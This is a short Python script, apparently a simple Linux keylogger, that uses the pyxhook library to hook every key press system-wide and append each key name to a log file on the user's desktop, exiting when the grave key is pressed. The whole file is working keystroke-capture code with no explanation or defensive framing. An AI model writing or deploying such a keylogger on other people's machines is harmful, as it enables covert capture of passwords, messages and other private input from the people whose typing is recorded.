import pyxhook
import os

key_log_file = os.environ.get("keyboard_log_file", os.path.expanduser("~/Desktop/keylogger.log"))

def onKeyDown(event):
    if(event.Key == 'grave'):
        os._exit()
    with open(key_log_file, 'a') as f :
        f.write('{}\n'.format(event.Key))


hook = pyxhook.HookManager()
hook.KeyDown = onKeyDown
hook.HookKeyboard()

try:
    hook.start()
except :
    pass
